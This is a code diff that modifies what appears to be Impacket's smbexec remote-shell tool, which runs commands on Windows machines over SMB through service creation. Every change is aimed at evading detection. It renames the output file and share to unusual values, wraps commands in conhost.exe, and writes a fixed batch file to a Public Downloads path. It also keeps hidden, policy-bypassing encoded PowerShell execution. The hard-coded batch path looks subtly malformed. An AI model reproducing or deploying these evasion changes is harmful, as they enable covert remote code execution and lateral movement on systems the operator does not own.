@@ -56,9 +56,9 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-OUTPUT_FILENAME = '__output'
-SMBSERVER_DIR   = '__tmp'
-DUMMY_SHARE     = 'TMP'
+OUTPUT_FILENAME = '__ren'
+SMBSERVER_DIR   = '__ens'
+DUMMY_SHARE     = 'VDL'
 CODEC = sys.stdout.encoding
 
 class SMBServer(Thread):
@@ -179,7 +179,8 @@ class RemoteShell(cmd.Cmd):
         self.__mode = mode
         self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
-        self.__command = ''
+        # Might also use wt.exe (wt.exe cmd /c c:\windows\system32\calc.exe)
+        self.__command = 'C:\\Windows\\System32\\conhost.exe C:\\Windows\\System32\\cmd.exe /Q /c '
         self.__shell = '%COMSPEC% /Q /c '
         self.__shell_type = shell_type
         self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
@@ -206,7 +207,6 @@ class RemoteShell(cmd.Cmd):
         resp = scmr.hROpenSCManagerW(self.__scmr)
         self.__scHandle = resp['lpScHandle']
         self.transferClient = rpc.get_smb_connection()
-        self.do_cd('')
 
     def finish(self):        
         # Just in case the ouput file is still in the share
@@ -281,9 +281,9 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        batchFile = '%SYSTEMROOT%\\' + ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.bat'
+        batchFile = 'C:\\Windows\\Users\\Public\\Downloads\\rens.bat'
                 
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
+        command = self.__shell + 'echo powershell.exe -command ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
 
         if self.__mode == 'SERVER':
